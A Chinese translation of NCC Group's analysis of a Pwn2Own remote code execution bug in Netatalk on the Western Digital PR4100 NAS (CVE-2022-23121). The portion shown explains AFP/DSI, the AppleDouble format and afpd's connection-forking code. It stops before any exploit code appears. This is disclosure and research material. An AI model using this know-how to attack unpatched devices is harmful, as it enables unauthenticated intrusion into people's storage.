<!DOCTYPE html><html lang="zh-CN" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="【翻译】西部数据PR4100 NAS RCE漏洞分析（CVE-2022-23121）" /><meta property="og:locale" content="zh_CN" /><meta name="description" content="本文翻译自NCC Group的博客，介绍了该团队在Pwn2Own比赛时针对西部数据PR4100 NAS的远程代码执行漏洞利用的细节。" /><meta property="og:description" content="本文翻译自NCC Group的博客，介绍了该团队在Pwn2Own比赛时针对西部数据PR4100 NAS的远程代码执行漏洞利用的细节。" /><link rel="canonical" href="https://gtrboy.github.io/posts/CVE-2022-23121/" /><meta property="og:url" content="https://gtrboy.github.io/posts/CVE-2022-23121/" /><meta property="og:site_name" content="gtrboy’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-01T11:11:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="【翻译】西部数据PR4100 NAS RCE漏洞分析（CVE-2022-23121）" /><meta name="twitter:site" content="@" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-01T11:11:00+08:00","datePublished":"2022-05-01T11:11:00+08:00","description":"本文翻译自NCC Group的博客，介绍了该团队在Pwn2Own比赛时针对西部数据PR4100 NAS的远程代码执行漏洞利用的细节。","headline":"【翻译】西部数据PR4100 NAS RCE漏洞分析（CVE-2022-23121）","mainEntityOfPage":{"@type":"WebPage","@id":"https://gtrboy.github.io/posts/CVE-2022-23121/"},"url":"https://gtrboy.github.io/posts/CVE-2022-23121/"}</script><title>【翻译】西部数据PR4100 NAS RCE漏洞分析（CVE-2022-23121） | gtrboy's blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="gtrboy's blog"><meta name="application-name" content="gtrboy's blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">gtrboy's blog</a></div><div class="site-subtitle font-italic">a dead beef</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/gtrboy" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gtboy.dream','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>【翻译】西部数据PR4100 NAS RCE漏洞分析（CVE-2022-23121）</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>【翻译】西部数据PR4100 NAS RCE漏洞分析（CVE-2022-23121）</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> gtrboy </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, May 1, 2022, 11:11 AM +0800" prep="on" > May 1 <i class="unloaded">2022-05-01T11:11:00+08:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="9612 words">53 min</span></div></div><div class="post-content"><blockquote><p>本文翻译自NCC Group的<a href="https://research.nccgroup.com/2022/03/24/remote-code-execution-on-western-digital-pr4100-nas-cve-2022-23121/">博客</a>，介绍了该团队在Pwn2Own比赛时针对西部数据PR4100 NAS的远程代码执行漏洞利用的细节。</p></blockquote><h1 id="概述">概述</h1><p>这篇博客文章介绍了2021年9月由NCC Group的Exploit Development Group（EDG）小组中的<a href="https://twitter.com/alexjplaskett">Alex Plaskett</a>，<a href="https://twitter.com/saidelike">Cedric Halbronn</a>以及<a href="https://twitter.com/fidgetingbits">Aaron Adams</a>三人发现并利用的一个返回值未检测漏洞。我们在2021年9月的Pwn2Own 2021的比赛中成功利用了该漏洞，攻击目标是西部数据PR4100 NAS设备。西部数据发布了发布了一个<a href="https://os5releasenotes.mycloud.com/#/">固件更新</a>（5.19.117），完全移除了对存在漏洞的第三方“没什么价值的Netatalk服务”的支持。由于该漏洞在<a href="https://github.com/Netatalk/Netatalk/commit/0c0465e4e85a27105b61b3918df8f8df0565367c">Netatalk代码</a>中得到了确认，因此被分配了CVE-2022-23121编号，同时ZDI发布了关于该漏洞的一份<a href="https://www.zerodayinitiative.com/advisories/ZDI-22-527/">报告</a>并提到Netatalk发布了最新的<a href="https://netatalk.sourceforge.io/3.1/ReleaseNotes3.1.13.html">3.1.13</a>版本，修复了包括该漏洞在内的多个漏洞。</p><h1 id="介绍">介绍</h1><p>该漏洞属于<a href="https://en.wikipedia.org/wiki/Netatalk">Netatalk</a>项目，该项目是<a href="https://en.wikipedia.org/wiki/Apple_Filing_Protocol">苹果归档协议（Apple Filing Protocol，AFP）</a>的开源实现。Netatalk代码实现于<code class="language-plaintext highlighter-rouge">/usr/sbin/afpd</code>服务以及<code class="language-plaintext highlighter-rouge">/lib64/libatalk.so</code>动态库。在<a href="https://shop.westerndigital.com/products/network-attached-storage/wd-my-cloud-pro-series-pr4100#WDBNFA0000NBK-NESN">西部数据My Cloud Pro PR4100</a> NAS设备中，<code class="language-plaintext highlighter-rouge">afpd</code>服务在默认状态下是打开的。</p><p>该漏洞可以在无需经过认证的前提下被远程利用。它允许一个攻击者以<code class="language-plaintext highlighter-rouge">nobody</code>用户的身份在NAS上远程执行代码。该用户可以访问通常情况下需要经过身份认证才能访问的私有共享。</p><p>我们已经在5.17.107版本上分析并利用了该漏洞，这将在下文中详细说明，该漏洞也可能存在于旧版本的固件中。</p><p>注意：西部数据My Cloud Pro Series PR4100 NAS设备是基于x86_64架构的。</p><p>我们将我们的利用命名为“月饼”。这是因为我们在2021年9月21日完成了利用代码的编写，这一天是2021年的<a href="https://en.wikipedia.org/wiki/Mid-Autumn_Festival">中秋节</a>。</p><blockquote><p>译者：该漏洞的研究人员似乎了解或喜欢中国文化，比如其中之一的Cedric Halbronn的Twitter ID是“saidelike”，即Cedric在中文翻译下的拼音。也可能他有一位关系很好的中国朋友/亲人。去年中秋，我在过节摸鱼，而大佬在挖洞🙃。</p></blockquote><h1 id="漏洞细节">漏洞细节</h1><h2 id="a-背景">A. 背景</h2><h3 id="dsiafp-协议">DSI/AFP 协议</h3><p>苹果归档协议（AFP）是知名的<a href="https://en.wikipedia.org/wiki/Server_Message_Block">Server Message Block（SMB）</a>协议的替代，用来在网络中共享文件。AFP协议的标准可以在<a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.363.9481&amp;rep=rep1&amp;type=pdf">这里</a>找到。</p><p>AFP通过<a href="https://en.wikipedia.org/wiki/Data_Stream_Interface">Data Stream Interface（DSI）</a>协议传输，该协议基于TCP/IP，开放在TCP的548端口。</p><p>然而，SMB协议在文件共享网络协议中更胜一筹，AFP协议则鲜为人知，即使它仍然在NAS等网络设备上被支持。AFP协议在苹果OS X 10.9版本系统中被弃用，AFP服务器则在OS X 11版本中被移除。</p><h3 id="netatalk">Netatalk</h3><p>Netatalk项目是UNIX平台下AFP/DSI协议的实现，其代码在2000年被转移至SourceForge。该项目最早的目标是允许类UNIX操作系统作为AFP服务器，为许多Macintosh或OS X客户端服务。</p><p>如之前所述，AFP协议越来越不受关注。这也影响到了Netatalk项目。最近的Netatalk稳定版本是<a href="http://netatalk.sourceforge.net/">3.1.12</a>，于2018年就已经被公开，这意味着这个项目几乎是一个被遗弃且不被支持的项目。</p><blockquote><p>译者：Netatalk当前已更新至<code class="language-plaintext highlighter-rouge">3.1.13</code>版本。</p></blockquote><p>Netatalk项目曾受编号为CVE-2018-1160漏洞的影响，该漏洞在低于（不包括）<code class="language-plaintext highlighter-rouge">3.1.12</code>版本的Netatalk中存在，产生的原因是DSIOpensession命令（<code class="language-plaintext highlighter-rouge">dsi_opensession()</code>）中存在越界写。这个漏洞曾经被用在<a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172">希捷NAS</a>设备中，因为该设备没有开启ASLR，之后在<a href="https://translate.google.com/translate?sl=auto&amp;tl=en&amp;u=https://ama2in9.top/2021/01/07/cve-2018-1160/">Hitcon 2019 CTF</a>中开启ASLR的环境中再次被利用。</p><blockquote><p>译者：关于<code class="language-plaintext highlighter-rouge">CVE-2018-1160</code>漏洞的分析，可见我的<a href="https://gtrboy.github.io/posts/netatalk/">上一篇</a>博客。</p></blockquote><h3 id="appledouble文件格式">AppleDouble文件格式</h3><p><a href="https://en.wikipedia.org/wiki/AppleSingle_and_AppleDouble_formats">AppleSingle和AppleDouble</a>文件格式的用途是存储操作系统中常规文件的元数据并允许在不同文件系统中共享这些信息，而无需担心这些系统间的互操作性。</p><p>这两个文件格式的主要思想是基于以下事实：任何文件系统都允许将文件存储为一系列字节。因此，可以将常规文件的元数据（也就是文件的属性信息）保存在附加文件当中，并将这些属性反映回另一端（或者至少部分属性），只要另一端的文件系统支持它们。否则，这些附加的属性也可以被丢弃。</p><p>AppleSingle和AppleDouble标准可以在<a href="https://web.archive.org/web/20180311140826/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf">这里</a>找到。AppleDouble文件格式在<a href="https://github.com/samba-team/samba/blob/master/source3/lib/adouble.c">samba的源代码</a>中也有注释：</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>/*
   "._" AppleDouble Header File Layout:
         MAGIC          0x00051607
         VERSION        0x00020000
         FILLER         0
         COUNT          2
     .-- AD ENTRY[0]    Finder Info Entry (must be first)
  .--+-- AD ENTRY[1]    Resource Fork Entry (must be last)
  |  |   /////////////
  |  '-&gt; FINDER INFO    Fixed Size Data (32 Bytes)
  |      ~~~~~~~~~~~~~  2 Bytes Padding
  |      EXT ATTR HDR   Fixed Size Data (36 Bytes)
  |      /////////////
  |      ATTR ENTRY[0] --.
  |      ATTR ENTRY[1] --+--.
  |      ATTR ENTRY[2] --+--+--.
  |         ...          |  |  |
  |      ATTR ENTRY[N] --+--+--+--.
  |      ATTR DATA 0   &lt;-'  |  |  |
  |      ////////////       |  |  |
  |      ATTR DATA 1   &lt;----'  |  |
  |      /////////////         |  |
  |      ATTR DATA 2   &lt;-------'  |
  |      /////////////            |
  |         ...                   |
  |      ATTR DATA N   &lt;----------'
  |      /////////////
  |         ...          Attribute Free Space
  |
  '----&gt; RESOURCE FORK
            ...          Variable Sized Data
            ...
*/
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">afpd</code>二进制文件和<code class="language-plaintext highlighter-rouge">libatalk.so</code>库文件并不包含符号。然而，由于<a href="https://en.wikipedia.org/wiki/GNU_General_Public_License">GNU公共许可证（GPL）</a>的要求，西部数据发布了它们使用的<a href="https://downloads.wdc.com/gpl/WDMyCloud_PR4100_GPL_v5.16.105_20210728.tar.gz">Netatalk的开源实现以及补丁</a>。西部数据发布的最新的源代码档案版本为<code class="language-plaintext highlighter-rouge">5.16.105</code>，与我们所分析的最新版本固件（5.17.107）并不匹配。然而，我们确认了<code class="language-plaintext highlighter-rouge">afpd</code>和<code class="language-plaintext highlighter-rouge">libatalk.so</code>在到目前为止的5个操作系统版本中并没有任何变化。因此，本文之后所示的代码通常来自于Netatalk的源代码。</p><p>注意：西部数据PR4100以最新的<code class="language-plaintext highlighter-rouge">3.1.12</code>版本的netatalk源代码为基础。</p><p>让我们分析一下，Netatalk在打开存储为AppleDouble格式的fork文件时，是如何接受客户端连接、解析AFP请求，从而触发漏洞代码部的。</p><p><code class="language-plaintext highlighter-rouge">main()</code>函数入口点初始化了很多内存对象，加载AFP配置信息，并开始监听AFP端口（TCP 548）。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/etc/afpd/main.c</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">ac</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">av</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="cm">/* wait for an appleshare connection. parent remains in the loop
     * while the children get handled by afp_over_{asp,dsi}.  this is
     * currently vulnerable to a denial-of-service attack if a
     * connection is made without an actual login attempt being made
     * afterwards. establishing timeouts for logins is a possible
     * solution. */</span>
    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">...</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">asev</span><span class="o">-&gt;</span><span class="n">used</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">asev</span><span class="o">-&gt;</span><span class="n">fdset</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">revents</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">POLLIN</span> <span class="o">|</span> <span class="n">POLLERR</span> <span class="o">|</span> <span class="n">POLLHUP</span> <span class="o">|</span> <span class="n">POLLNVAL</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">switch</span> <span class="p">(</span><span class="n">asev</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fdtype</span><span class="p">)</span> <span class="p">{</span>

                <span class="k">case</span> <span class="n">LISTEN_FD</span><span class="p">:</span>
                    <span class="k">if</span> <span class="p">((</span><span class="n">child</span> <span class="o">=</span> <span class="n">dsi_start</span><span class="p">(</span><span class="o">&amp;</span><span class="n">obj</span><span class="p">,</span> <span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="p">)(</span><span class="n">asev</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="k">private</span><span class="p">),</span> <span class="n">server_children</span><span class="p">)))</span> <span class="p">{</span>
                        <span class="p">...</span>
                    <span class="p">}</span>
                    <span class="k">break</span><span class="p">;</span>
    <span class="p">...</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">dsi_start()</code>函数基本上只调用了2个函数：<code class="language-plaintext highlighter-rouge">dsi_getsession()</code>以及<code class="language-plaintext highlighter-rouge">afp_over_dsi()</code>。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/etc/afpd/main.c</span>
<span class="k">static</span> <span class="n">afp_child_t</span> <span class="o">*</span><span class="nf">dsi_start</span><span class="p">(</span><span class="n">AFPObj</span> <span class="o">*</span><span class="n">obj</span><span class="p">,</span> <span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">,</span> <span class="n">server_child_t</span> <span class="o">*</span><span class="n">server_children</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">afp_child_t</span> <span class="o">*</span><span class="n">child</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">dsi_getsession</span><span class="p">(</span><span class="n">dsi</span><span class="p">,</span> <span class="n">server_children</span><span class="p">,</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">.</span><span class="n">tickleval</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">child</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_afpd</span><span class="p">,</span> <span class="s">"dsi_start: session error: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* we've forked. */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">configfree</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">dsi</span><span class="p">);</span>
        <span class="n">afp_over_dsi</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span> <span class="cm">/* start a session */</span>
        <span class="n">exit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">child</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>其中<code class="language-plaintext highlighter-rouge">dsi_getsession()</code>函数调用了<code class="language-plaintext highlighter-rouge">dsi-&gt;proto_open</code>这个函数指针，该指针指向<code class="language-plaintext highlighter-rouge">dsi_tcp_open()</code>函数。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/dsi/dsi_getsess.c</span>
<span class="cm">/*!
 * Start a DSI session, fork an afpd process
 *
 * @param childp    (w) after fork: parent return pointer to child, child returns NULL
 * @returns             0 on sucess, any other value denotes failure
 */</span>
<span class="kt">int</span> <span class="nf">dsi_getsession</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">,</span> <span class="n">server_child_t</span> <span class="o">*</span><span class="n">serv_children</span><span class="p">,</span> <span class="kt">int</span> <span class="n">tickleval</span><span class="p">,</span> <span class="n">afp_child_t</span> <span class="o">**</span><span class="n">childp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">...</span>
  <span class="k">switch</span> <span class="p">(</span><span class="n">pid</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">proto_open</span><span class="p">(</span><span class="n">dsi</span><span class="p">))</span> <span class="p">{</span> <span class="cm">/* in libatalk/dsi/dsi_tcp.c */</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">dsi_tcp_open()</code>函数接受客户端连接，通过<code class="language-plaintext highlighter-rouge">fork()</code>函数创建子进程，并初始化与客户端的DSI会话。</p><p>提示：这对之后的利用非常有用。</p><blockquote><p>译者：CVE-2018-1160 同样需要利用Netatalk的这一特性，即对每个客户端发来的连接，都是用<code class="language-plaintext highlighter-rouge">fork()</code>函数新建一个子进程单独处理会话。这是由于通过<code class="language-plaintext highlighter-rouge">fork()</code>创建的每个子进程的内存空间的起始地址是相同的，可以通过该特性，利用信息泄露漏洞获取地址。</p></blockquote><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="cm">/* accept the socket and do a little sanity checking */</span>
<span class="k">static</span> <span class="n">pid_t</span> <span class="nf">dsi_tcp_open</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
    <span class="n">SOCKLEN_T</span> <span class="n">len</span><span class="p">;</span>

    <span class="n">len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">client</span><span class="p">);</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">socket</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">serversock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">client</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
    <span class="p">...</span>
   <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="p">(</span><span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">())</span> <span class="p">)</span> <span class="p">{</span> <span class="cm">/* child */</span>
        <span class="p">...</span>
    <span class="p">}</span>

    <span class="cm">/* send back our pid */</span>
    <span class="k">return</span> <span class="n">pid</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>回到<code class="language-plaintext highlighter-rouge">dsi_getsession()</code>函数，父进程<code class="language-plaintext highlighter-rouge">afpd</code>设置 <code class="language-plaintext highlighter-rouge">*childp!=NULL</code>，而fork出的处理客户端连接的子进程设置 <code class="language-plaintext highlighter-rouge">*childp==NULL</code>。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/dsi/dsi_getsess.c</span>
<span class="cm">/*!
 * Start a DSI session, fork an afpd process
 *
 * @param childp    (w) after fork: parent return pointer to child, child returns NULL
 * @returns             0 on sucess, any other value denotes failure
 */</span>
<span class="kt">int</span> <span class="nf">dsi_getsession</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">,</span> <span class="n">server_child_t</span> <span class="o">*</span><span class="n">serv_children</span><span class="p">,</span> <span class="kt">int</span> <span class="n">tickleval</span><span class="p">,</span> <span class="n">afp_child_t</span> <span class="o">**</span><span class="n">childp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">...</span>
  <span class="k">switch</span> <span class="p">(</span><span class="n">pid</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">proto_open</span><span class="p">(</span><span class="n">dsi</span><span class="p">))</span> <span class="p">{</span> <span class="cm">/* in libatalk/dsi/dsi_tcp.c */</span>
  <span class="k">case</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
    <span class="cm">/* if we fail, just return. it might work later */</span>
    <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_getsess: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

  <span class="k">case</span> <span class="mi">0</span><span class="p">:</span> <span class="cm">/* child. mostly handled below. */</span>
    <span class="k">break</span><span class="p">;</span>

  <span class="nl">default:</span> <span class="cm">/* parent */</span>
    <span class="cm">/* using SIGKILL is hokey, but the child might not have
     * re-established its signal handler for SIGTERM yet. */</span>
    <span class="n">close</span><span class="p">(</span><span class="n">ipc_fds</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
